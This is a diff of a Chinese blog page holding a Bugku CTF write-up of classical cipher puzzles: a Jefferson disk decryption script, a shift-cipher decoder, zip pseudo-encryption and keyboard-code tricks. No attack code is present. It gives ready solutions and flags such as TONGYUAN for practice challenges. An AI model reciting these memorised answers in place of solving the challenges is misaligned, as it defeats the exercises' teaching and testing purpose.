-          <a href="#托马斯杰斐逊" class="heading-link"><i class="fas fa-link"></i></a>托马斯杰斐逊</h2>
-      <p>根据提示可知是杰斐逊圆盘加密，附上解密脚本</p>
-<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">tomas = <span class="string">'''ZWAXJGDLUBVIQHKYPNTCRMOSFE</span></span><br><span class="line"><span class="string">KPBELNACZDTRXMJQOYHGVSFUWI</span></span><br><span class="line"><span class="string">BDMAIZVRNSJUWFHTEQGYXPLOCK</span></span><br><span class="line"><span class="string">RPLNDVHGFCUKTEBSXQYIZMJWAO</span></span><br><span class="line"><span class="string">IHFRLABEUOTSGJVDKCPMNZQWXY</span></span><br><span class="line"><span class="string">AMKGHIWPNYCJBFZDRUSLOQXVET</span></span><br><span class="line"><span class="string">GWTHSPYBXIZULVKMRAFDCEONJQ</span></span><br><span class="line"><span class="string">NOZUTWDCVRJLXKISEFAPMYGHBQ</span></span><br><span class="line"><span class="string">QWATDSRFHENYVUBMCOIKZGJXPL</span></span><br><span class="line"><span class="string">WABMCXPLTDSRJQZGOIKFHENYVU</span></span><br><span class="line"><span class="string">XPLTDAOIKFZGHENYSRUBMCQWVJ</span></span><br><span class="line"><span class="string">TDSWAYXPLVUBOIKZGJRFHENMCQ</span></span><br><span class="line"><span class="string">BMCSRFHLTDENQWAOXPYVUIKZGJ</span></span><br><span class="line"><span class="string">XPHKZGJTDSENYVUBMLAOIRFCQW</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">new_tomas = []</span><br><span class="line">tmp = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(tomas)):</span><br><span class="line">	<span class="keyword">if</span> tomas[i] == <span class="string">'\n'</span>:</span><br><span class="line">		new_tomas.append(tmp)</span><br><span class="line">		tmp = <span class="string">''</span></span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		tmp += tomas[i]</span><br><span class="line">key =  [<span class="number">2</span>,<span class="number">5</span>,<span class="number">1</span>,<span class="number">3</span>,<span class="number">6</span>,<span class="number">4</span>,<span class="number">9</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">14</span>,<span class="number">10</span>,<span class="number">13</span>,<span class="number">11</span>,<span class="number">12</span>]</span><br><span class="line">cipher = <span class="string">'HCBTSXWCRQGLES'</span></span><br><span class="line"><span class="keyword">for</span> index <span class="keyword">in</span> range(len(cipher)):</span><br><span class="line">	<span class="keyword">for</span> p <span class="keyword">in</span> range(<span class="number">26</span>):</span><br><span class="line">		<span class="keyword">if</span> new_tomas[key[index]<span class="number">-1</span>][p] == cipher[index]:</span><br><span class="line">			new_tomas[key[index]<span class="number">-1</span>] = new_tomas[key[index]<span class="number">-1</span>][p:] + new_tomas[key[index]<span class="number">-1</span>][:p]</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> item <span class="keyword">in</span> key:</span><br><span class="line">	print(new_tomas[item<span class="number">-1</span>][<span class="number">-6</span>:]+new_tomas[item<span class="number">-1</span>][:<span class="number">-6</span>])   <span class="comment"># 让输出更明显一点</span></span><br></pre></td></tr></table></div></figure>
+<h2 id="奇怪的密码"><a href="#奇怪的密码" class="headerlink" title="奇怪的密码"></a>奇怪的密码</h2><p>其实就是把flag的每一位的ascii值一次加1,2,3,..反过来解一下就可以了</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">cipher = <span class="string">'gndk€rlqhmtkwwp&#125;z'</span></span><br><span class="line">plain = <span class="string">''</span></span><br><span class="line">seq = <span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> cipher:</span><br><span class="line">	<span class="keyword">if</span> i == <span class="string">'€'</span>:     <span class="comment"># 该字符为非法字符，不去掉的话可能会报错</span></span><br><span class="line">		seq += <span class="number">1</span></span><br><span class="line">		<span class="keyword">continue</span></span><br><span class="line">	plain += chr((ord(i) - seq))</span><br><span class="line">	seq += <span class="number">1</span></span><br><span class="line">print(plain)</span><br></pre></td></tr></table></figure>
+<h2 id="托马斯杰斐逊"><a href="#托马斯杰斐逊" class="headerlink" title="托马斯杰斐逊"></a>托马斯杰斐逊</h2><p>根据提示可知是杰斐逊圆盘加密，附上解密脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">tomas = <span class="string">'''ZWAXJGDLUBVIQHKYPNTCRMOSFE</span></span><br><span class="line"><span class="string">KPBELNACZDTRXMJQOYHGVSFUWI</span></span><br><span class="line"><span class="string">BDMAIZVRNSJUWFHTEQGYXPLOCK</span></span><br><span class="line"><span class="string">RPLNDVHGFCUKTEBSXQYIZMJWAO</span></span><br><span class="line"><span class="string">IHFRLABEUOTSGJVDKCPMNZQWXY</span></span><br><span class="line"><span class="string">AMKGHIWPNYCJBFZDRUSLOQXVET</span></span><br><span class="line"><span class="string">GWTHSPYBXIZULVKMRAFDCEONJQ</span></span><br><span class="line"><span class="string">NOZUTWDCVRJLXKISEFAPMYGHBQ</span></span><br><span class="line"><span class="string">QWATDSRFHENYVUBMCOIKZGJXPL</span></span><br><span class="line"><span class="string">WABMCXPLTDSRJQZGOIKFHENYVU</span></span><br><span class="line"><span class="string">XPLTDAOIKFZGHENYSRUBMCQWVJ</span></span><br><span class="line"><span class="string">TDSWAYXPLVUBOIKZGJRFHENMCQ</span></span><br><span class="line"><span class="string">BMCSRFHLTDENQWAOXPYVUIKZGJ</span></span><br><span class="line"><span class="string">XPHKZGJTDSENYVUBMLAOIRFCQW</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">new_tomas = []</span><br><span class="line">tmp = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(tomas)):</span><br><span class="line">	<span class="keyword">if</span> tomas[i] == <span class="string">'\n'</span>:</span><br><span class="line">		new_tomas.append(tmp)</span><br><span class="line">		tmp = <span class="string">''</span></span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		tmp += tomas[i]</span><br><span class="line">key =  [<span class="number">2</span>,<span class="number">5</span>,<span class="number">1</span>,<span class="number">3</span>,<span class="number">6</span>,<span class="number">4</span>,<span class="number">9</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">14</span>,<span class="number">10</span>,<span class="number">13</span>,<span class="number">11</span>,<span class="number">12</span>]</span><br><span class="line">cipher = <span class="string">'HCBTSXWCRQGLES'</span></span><br><span class="line"><span class="keyword">for</span> index <span class="keyword">in</span> range(len(cipher)):</span><br><span class="line">	<span class="keyword">for</span> p <span class="keyword">in</span> range(<span class="number">26</span>):</span><br><span class="line">		<span class="keyword">if</span> new_tomas[key[index]<span class="number">-1</span>][p] == cipher[index]:</span><br><span class="line">			new_tomas[key[index]<span class="number">-1</span>] = new_tomas[key[index]<span class="number">-1</span>][p:] + new_tomas[key[index]<span class="number">-1</span>][:p]</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> item <span class="keyword">in</span> key:</span><br><span class="line">	print(new_tomas[item<span class="number">-1</span>][<span class="number">-6</span>:]+new_tomas[item<span class="number">-1</span>][:<span class="number">-6</span>])   <span class="comment"># 让输出更明显一点</span></span><br></pre></td></tr></table></figure>
 <p>输出如下</p>
 <blockquote>
 <p>XMJQOYHGVSFUWIKPBELNACZDTR<br>SGJVDKCPMNZQWXYIHFRLABEUOT<br>XJGDLUBVIQHKYPNTCRMOSFEZWA<br>SJUWFHTEQGYXPLOCKBDMAIZVRN<br>BFZDRUSLOQXVETAMKGHIWPNYCJ<br>UKTEBSXQYIZMJWAORPLNDVHGFC<br>GJXPLQWATDSRFHENYVUBMCOIKZ<br>KMRAFDCEONJQGWTHSPYBXIZULV<br>UTWDCVRJLXKISEFAPMYGHBQNOZ<br>AOIRFCQWXPHKZGJTDSENYVUBML<br>DSRJQZGOIKFHENYVUWABMCXPLT<br>MCSRFHLTDENQWAOXPYVUIKZGJB<br>IKFZGHENYSRUBMCQWVJXPLTDAO<br>NMCQTDSWAYXPLVUBOIKZGJRFHE</p>
 </blockquote>
 <p>好像默认是按照第7位来当做密文，所以我特地按照这个格式来，那么第一列就是明文了，注意flag要求小写。</p>
-
-        <h2 id="zip伪加密">
-          <a href="#zip伪加密" class="heading-link"><i class="fas fa-link"></i></a>zip伪加密</h2>
-      <p>已经说了是zip伪加密，直接16进制修改一下即可</p>
-
-        <h2 id="告诉你个秘密-ISCCCTF">
-          <a href="#告诉你个秘密-ISCCCTF" class="heading-link"><i class="fas fa-link"></i></a>告诉你个秘密(ISCCCTF)</h2>
-      <p>看字符串像16进制，转成字符串可以看到像base64，再解码一次</p>
-<figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">r5yG lp9I BjM tFhBT6uh y7iJ QsZ bhM</span><br></pre></td></tr></table></div></figure>
+<h2 id="zip伪加密"><a href="#zip伪加密" class="headerlink" title="zip伪加密"></a>zip伪加密</h2><p>已经说了是zip伪加密，直接16进制修改一下即可</p>
+<h2 id="告诉你个秘密-ISCCCTF"><a href="#告诉你个秘密-ISCCCTF" class="headerlink" title="告诉你个秘密(ISCCCTF)"></a>告诉你个秘密(ISCCCTF)</h2><p>看字符串像16进制，转成字符串可以看到像base64，再解码一次</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">r5yG lp9I BjM tFhBT6uh y7iJ QsZ bhM</span><br></pre></td></tr></table></figure>
 <p>这是键盘对应的码</p>
-<figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TONGYUAN</span><br></pre></td></tr></table></div></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TONGYUAN</span><br></pre></td></tr></table></figure>
 <p>注意本题没有说明flag的提交方式，应该是 <code>flag:TONGYUAN</code></p>
-
-        <h2 id="来自宇宙的信号">
-          <a href="#来自宇宙的信号" class="heading-link"><i class="fas fa-link"></i></a>来自宇宙的信号</h2>
-      <p>既然说了是银河战队，直接百度搜 <code>银河 文字</code>，会看到第一个结果赫然是标准银河字母，对照一下就可以了。</p>
+<h2 id="来自宇宙的信号"><a href="#来自宇宙的信号" class="headerlink" title="来自宇宙的信号"></a>来自宇宙的信号</h2><p>既然说了是银河战队，直接百度搜 <code>银河 文字</code>，会看到第一个结果赫然是标准银河字母，对照一下就可以了。</p>
 <p>至此，所有加密题目OK。</p>
-</div><footer class="post-footer"><div class="post-ending ending"><div class="ending__text">------ END ------</div></div><div class="post-copyright copyright"><div class="copyright-author"><span class="copyright-author__name">Author: </span><span class="copyright-author__value"><a href="http://chaosec.top">Aesm1p</a></span></div><div class="copyright-link"><span class="copyright-link__name">Link: </span><span class="copyright-link__value"><a href="http://chaosec.top/2018/04/03/bugku-writeup%E7%BB%AD/">http://chaosec.top/2018/04/03/bugku-writeup%E7%BB%AD/</a></span></div><div class="copyright-notice"><span class="copyright-notice__name">Copyright: </span><span class="copyright-notice__value">All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" rel="external nofollow" target="_blank">BY-NC-SA</a> unless stating additionally</span></div></div><div class="post-tags"><span class="post-tags-item"><span class="post-tags-item__icon"><i class="fas fa-tag"></i></span><a class="post-tags-item__link" href="http://chaosec.top/tags/CTF/">CTF</a></span></div><div class="post-reward reward"><div class="reward-button">Buy me a coffee</div><div class="reward-qrcode"><span class="reward-qrcode-alipay"><img class="reward-qrcode-alipay__img" src="/assets/reward-alipay.jpg"><div class="reward-qrcode-alipay__text">Alipay</div></span><span class="reward-qrcode-wechat"><img class="reward-qrcode-wechat__img" src="/assets/reward-wechat.png"><div class="reward-qrcode-wechat__text">Wechat</div></span></div></div><nav class="post-paginator paginator"><div class="paginator-prev"><a class="paginator-prev__link" href="/2018/04/20/docker1/"><span class="paginator-prev__icon"><i class="fas fa-angle-left"></i></span><span class="paginator-prev__text">Docker简介与简单页面搭建</span></a></div><div class="paginator-next"><a class="paginator-next__link" href="/2018/03/23/CBC-Attack/"><span class="paginator-prev__text">CBC字节翻转攻击</span><span class="paginator-next__icon"><i class="fas fa-angle-right"></i></span></a></div></nav></footer></div></div></div><div class="clearfix"></div></div></main><footer class="footer" id="footer"><div class="footer-inner"><div><span>Copyright © 2020</span><span class="footer__icon"><i class="fas fa-heart"></i></span><span>Aesm1p</span></div><div><span>Powered by <a href="http://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a></span></div></div></footer><div class="loading-bar" id="loading-bar"><div class="loading-bar__progress"></div></div><div class="back2top" id="back2top"><span class="back2top__icon"><i class="fas fa-rocket"></i></span></div></div><div class="search-mask"></div><div class="search-popup"><span class="search-close"></span><div class="search-input"><input placeholder="Search for Posts (Support multiple keywords)"></div><div class="search-results"></div></div><script src="https://cdn.jsdelivr.net/npm/jquery@v3.4.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.ui.min.js"></script><script src="https://cdn.jsdelivr.net/npm/canvas-nest.js@1.0.1/dist/canvas-nest.min.js" color="255,165,0" opacity="0.6" count="99" zIndex="-1"></script><script src="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js"></script><script>function initSearch() {
-  var isXML = true;
-  var search_path = 'search.json';
 
-  if (!search_path) {
-    search_path = 'search.xml';
-  } else if (/json$/i.test(search_path)) {
-    isXML = false;
-  }
+      
+    </div>
 
-  var path = '/' + search_path;
-  $.ajax({
-    url: path,
-    dataType: isXML ? 'xml' : 'json',
-    async: true,
-    success: function (res) {
-      var datas = isXML ? $('entry', res).map(function () {
-        // 将 XML 转为 JSON
-        return {
-          title: $('title', this).text(),
-          content: $('content', this).text(),
-          url: $('url', this).text()
-        };
-      }).get() : res;
-      var $input = $('.search-input input');
-      var $result = $('.search-results');
-      // 搜索对象（标题、内容）的权重，影响显示顺序
-      var WEIGHT = { title: 100, content: 1 };
-      var searchPost = function () {
-        var searchText = $input.val().toLowerCase().trim();
-        // 根据空白字符分隔关键字
-        var keywords = searchText.split(/[\s]+/);
-        // 搜索结果
-        var matchPosts = [];
+  </div>
 
-        // 有多个关键字时，将原文字整个保存下来
-        if (keywords.length > 1) {
-          keywords.push(searchText);
+  <div class="article-footer">
+    <div class="article-meta pull-left">
+
+    
+      
+
+    <span class="post-categories">
+      <i class="icon-categories"></i>
+        <a href="/categories/writeup/">writeup</a>
+    </span>
+    
+
+    
+    
+
+    <span class="post-tags">
+      <i class="icon-tags"></i>
+        <a href="/tags/CTF/">CTF</a>
+    </span>
+    
+
+    </div>
+
+    
+  </div>
+</article>
+
+  
+
+
+
+
+
+
+    </main>
+
+    <footer class="site-footer">
+  <p class="site-info">
+    Proudly powered by <a href="https://hexo.io/" target="_blank">Hexo</a> and
+    Theme by <a href="https://github.com/CodeDaraW/Hacker" target="_blank">Hacker</a>
+    </br>
+    
+    &copy; 2021 Aesm1p
+    
+  </p>
+</footer>
+    
+    
+  </div>
+</div>
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+        tex2jax: {
+            inlineMath: [ ["$","$"], ["\\(","\\)"] ],
+            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code'],
+            processEscapes: true
         }
-        // 防止未输入字符时搜索
-        if (searchText.length > 0) {
-          datas.forEach(function (data) {
-            var isMatch  = false;
-            // 没有标题的文章使用预设的 i18n 变量代替
-            var title = (data.title && data.title.trim()) || '[ Untitled ]';
-            var titleLower = title && title.toLowerCase();
-            // 删除 HTML 标签 和 所有空白字符
-            var content = data.content && data.content.replace(/<[^>]+>/g, '');
-            var contentLower = content && content.toLowerCase();
-            // 删除重复的 /
-            var postURL = data.url && decodeURI(data.url).replace(/\/{2,}/g, '/');
-            // 标题中匹配到的关键词
-            var titleHitSlice = [];
-            // 内容中匹配到的关键词
-            var contentHitSlice = [];
-
-            keywords.forEach(function (keyword) {
-              /**
-              * 获取匹配的关键词的索引
-              * @param {String} keyword 要匹配的关键字
-              * @param {String} text 原文字
-              * @param {Boolean} caseSensitive 是否区分大小写
-              * @param {Number} weight 匹配对象的权重。权重大的优先显示
-              * @return {Array}
-              */
-              function getIndexByword (word, text, caseSensitive, weight) {
-                if (!word || !text) {
-                  return [];
-                };
-
-                var startIndex = 0; // 每次匹配的开始索引
-                var index = -1;     // 匹配到的索引值
-                var result = [];    // 匹配结果
-
-                if (!caseSensitive) {
-                  word = word.toLowerCase();
-                  text = text.toLowerCase();
-                }
-
-                while((index = text.indexOf(word, startIndex)) !== -1) {
-                  var hasMatch = false;
-                  // 索引位置相同的关键词，保留长度较长的
-                  titleHitSlice.forEach(function (hit) {
-                    if (hit.index === index && hit.word.length < word.length) {
-                      hit.word = word;
-                      hasMatch = true;
-                    }
-                  });
-                  startIndex = index + word.length;
-                  !hasMatch && result.push({ index: index, word: word, weight: weight });
-                }
-                return result;
-              }
-              titleHitSlice = titleHitSlice.concat(getIndexByword(keyword, titleLower, false, WEIGHT.title));
-              contentHitSlice = contentHitSlice.concat(getIndexByword(keyword, contentLower, false, WEIGHT.content));
-            });
-
-            var hitTitle = titleHitSlice.length;
-            var hitContent = contentHitSlice.length;
-
-            if (hitTitle > 0 || hitContent > 0) {
-              isMatch = true;
-            }
-            if (isMatch) {
-              ;[titleHitSlice, contentHitSlice].forEach(function (hit) {
-                // 按照匹配文字的索引的递增顺序排序
-                hit.sort(function (left, right) {
-                  return left.index - right.index;
-                });
-              });
-              /**
-              * 给文本中匹配到的关键词添加标记，从而进行高亮显示
-              * @param {String} text 原文本
-              * @param {Array} hitSlice 匹配项的索引信息
-              * @param {Number} start 开始索引
-              * @param {Number} end 结束索引
-              * @return {String}
-              */
-              function highlightKeyword (text, hitSlice, start, end) {
-                if (!text || !hitSlice || !hitSlice.length) {
-                  return;
-                }
-
-                var result = '';
-                var startIndex = start;
-                var endIndex = end;
-                hitSlice.forEach(function (hit) {
-                  if (hit.index < startIndex) {
-                    return;
-                  }
-
-                  var hitWordEnd = hit.index + hit.word.length;
-                  result += text.slice(startIndex, hit.index);
-                  result += '<b>' + text.slice(hit.index, hitWordEnd) + '</b>';
-                  startIndex = hitWordEnd;
-                });
-                result += text.slice(startIndex, endIndex);
-                return result;
-              }
-
-              var postData = {};
-              // 文章总的搜索权重
-              var postWeight = titleHitSlice.length * WEIGHT.title + contentHitSlice.length * WEIGHT.content;
-              // 标记匹配关键词后的标题
-              var postTitle = highlightKeyword(title, titleHitSlice, 0, title.length) || title;
-              // 标记匹配关键词后的内容
-              var postContent;
-              // 显示内容的长度
-              var SHOW_WORD_LENGTH = 200;
-              // 命中关键词前的字符显示长度
-              var SHOW_WORD_FRONT_LENGTH = 20;
-              var SHOW_WORD_END_LENGTH = SHOW_WORD_LENGTH - SHOW_WORD_FRONT_LENGTH;
-
-              // 截取匹配的第一个字符，前后共 200 个字符来显示
-              if (contentHitSlice.length > 0) {
-                var firstIndex = contentHitSlice[0].index;
-                var start = firstIndex > SHOW_WORD_FRONT_LENGTH ? firstIndex - SHOW_WORD_FRONT_LENGTH : 0;
-                var end = firstIndex + SHOW_WORD_END_LENGTH;
-                postContent = highlightKeyword(content, contentHitSlice, start, end);
-              } else { // 未匹配到内容，直接截取前 200 个字符来显示
-                postContent = content.slice(0, SHOW_WORD_LENGTH);
-              }
-              postData.title = postTitle;
-              postData.content = postContent;
-              postData.url = postURL;
-              postData.weight = postWeight;
-              matchPosts.push(postData);
-            }
-          });
-        }
-
-        var resultInnerHtml = '';
-        if (matchPosts.length) {
-          // 按权重递增的顺序排序，使权重大的优先显示
-          matchPosts.sort(function (left, right) {
-            return right.weight - left.weight;
-          });
-          resultInnerHtml += '<ul>';
-          matchPosts.forEach(function (post) {
-            resultInnerHtml += '<li><a class="search-results-title" href="' + post.url + '">';
-            resultInnerHtml += post.title;
-            resultInnerHtml += '</a><div class="search-results-content">';
-            resultInnerHtml += post.content;
-            resultInnerHtml += '</div></li>';
-          });
-          resultInnerHtml += '</ul>';
-        } else {
-          resultInnerHtml += '<div class="search-results-none"><i class="far fa-meh"></i></div>';
-        }
-        $result.html(resultInnerHtml);
-      };
-      $input.on('input', searchPost);
-      $input.on('keyup', function (e) {
-        if (e.keyCode === Stun.utils.codeToKeyCode('Enter')) {
-          searchPost();
-        }
-      });
-    }
-  });
-}
-
-function closeSearch () {
-  $('body').css({ overflow: 'auto' });
-  $('.search-popup').css({ display: 'none' });
-  $('.search-mask').css({ display: 'none' });
-}
-
-window.addEventListener('DOMContentLoaded', function () {
-  Stun.utils.pjaxReloadLocalSearch = function () {
-    $('.header-nav-search').on('click', function (e) {
-      e.stopPropagation();
-      $('body').css('overflow', 'hidden');
-      $('.search-popup')
-        .velocity('stop')
-        .velocity('transition.expandIn', {
-          duration: 300,
-          complete: function () {
-            $('.search-popup input').focus();
-          }
-        });
-      $('.search-mask')
-        .velocity('stop')
-        .velocity('transition.fadeIn', {
-          duration: 300
-        });
-
-      initSearch();
     });
-    $('.search-mask, .search-close').on('click', function () {
-      closeSearch();
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax();
+        for (var i = 0; i < all.length; ++i)
+            all[i].SourceElement().parentNode.className += ' has-jax';
     });
-    $(document).on('keydown', function (e) {
-      // Escape <=> 27
-      if (e.keyCode === Stun.utils.codeToKeyCode('Escape')) {
-        closeSearch();
-      }
-    });
-  };
-
-  Stun.utils.pjaxReloadLocalSearch();
-}, false);</script><script src="/js/utils.js?v=2.1.1"></script><script src="/js/stun-boot.js?v=2.1.1"></script><script src="/js/scroll.js?v=2.1.1"></script><script src="/js/header.js?v=2.1.1"></script><script type="application/json" src="/search.json"></script></body></html>
+</script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-MML-AM_CHTML"></script>
+</body>
+</html>
